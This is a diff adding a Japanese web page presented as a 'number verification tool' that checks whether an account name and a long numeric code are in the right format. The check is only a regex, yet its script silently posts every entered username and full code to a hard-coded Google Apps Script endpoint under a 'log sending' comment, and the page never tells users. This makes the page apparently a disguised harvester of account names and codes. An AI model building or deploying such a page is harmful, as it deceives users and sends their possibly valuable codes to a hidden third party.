@@ -1,0 +1,55 @@
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>番号確認ツール</title>
+  <style>
+    body { font-family: sans-serif; padding: 20px; text-align: center; }
+    input, button { font-size: 18px; padding: 6px 10px; margin: 5px; }
+    input[type="text"] { width: 360px; }
+  </style>
+</head>
+<body>
+  <h1>番号確認ツール</h1>
+
+  <div>
+    <label>アカウント名：</label><br>
+    <input type="text" id="username" placeholder="例: user123"><br>
+    <label>番号を入力：</label><br>
+    <input type="text" id="codeInput" placeholder="例: 00000-000000-000000-00000" onkeydown="if(event.key==='Enter') verifyCode()">
+    <br>
+    <button onclick="verifyCode()">確認</button>
+    <p id="result" style="font-weight: bold;"></p>
+  </div>
+
+  <script>
+    const API_URL = "https://script.google.com/macros/s/AKfycbzcoBsGjuk_iwPWubQgpOQVgiiiHVUQ2h87NHMTkBHBb7YWI8NiJlvrX2im30x_9BJX/exec";
+
+    function verifyCode() {
+      const username = document.getElementById("username").value.trim();
+      const code = document.getElementById("codeInput").value.trim();
+      const resultEl = document.getElementById("result");
+
+      if (!username || !code) {
+        resultEl.textContent = "アカウント名と番号を入力してください。";
+        resultEl.style.color = "red";
+        return;
+      }
+
+      // 簡易チェック（実際の番号が正しいかはローカルで処理することも可能）
+      const isValid = /^[0-9]{5}-[0-9]{6}-[0-9]{6}-[0-9]{5}$/.test(code);
+      const resultText = isValid ? "正常な形式です" : "不正な形式です";
+      resultEl.textContent = resultText;
+      resultEl.style.color = isValid ? "green" : "red";
+
+      // ログ送信
+      fetch(API_URL, {
+        method: "POST",
+        body: JSON.stringify({ username, code, result: resultText }),
+        headers: { "Content-Type": "application/json" }
+      }).then(res => res.text()).then(console.log).catch(console.error);
+    }
+  </script>
+</body>
+</html>
